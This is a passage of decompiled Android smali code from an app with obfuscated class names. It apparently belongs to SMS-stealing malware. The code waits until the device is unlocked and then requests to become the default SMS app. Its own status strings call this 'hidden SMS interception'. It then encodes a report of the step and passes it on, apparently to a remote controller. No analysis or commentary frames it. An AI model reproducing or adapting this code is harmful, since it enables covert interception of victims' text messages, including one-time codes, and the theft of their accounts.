    invoke-virtual {v15, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v15, "|Request for SMS manager change(hidden SMS interception)|"

    goto :goto_13

    :cond_26
    if-nez v9, :cond_27

    sget v13, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v13, v2, :cond_27

    invoke-static/range {p0 .. p0}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->getPackageName()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v2, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_27

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->e:Landroid/content/Context;

    const-string v2, "keyguard"

    invoke-virtual {v1, v2}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/KeyguardManager;

    invoke-virtual {v2}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v2

    if-nez v2, :cond_27

    :try_start_13
    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v2, v4, v5}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_13
    .catch Ljava/lang/InterruptedException; {:try_start_13 .. :try_end_13} :catch_12

    goto :goto_12

    :catch_12
    move-exception v0

    move-object v2, v0

    invoke-virtual {v2}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_12
    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "swspacket"

    invoke-virtual {v2, v1, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-instance v4, Landroid/content/Intent;

    const-string v5, "android.provider.Telephony.ACTION_CHANGE_DEFAULT"

    invoke-direct {v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v5, "package"

    invoke-virtual {v4, v5, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x10000000

    invoke-virtual {v4, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v4}, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->startActivity(Landroid/content/Intent;)V

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v4, "4"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v13, "p="

    invoke-virtual {v5, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v15, v1, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v15, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v15, "|Request to change the manager SMS to default|"

    :goto_13
    invoke-virtual {v14, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v5, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v1, v4, v5}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_27
    move v4, v3

    goto/16 :goto_6
.end method
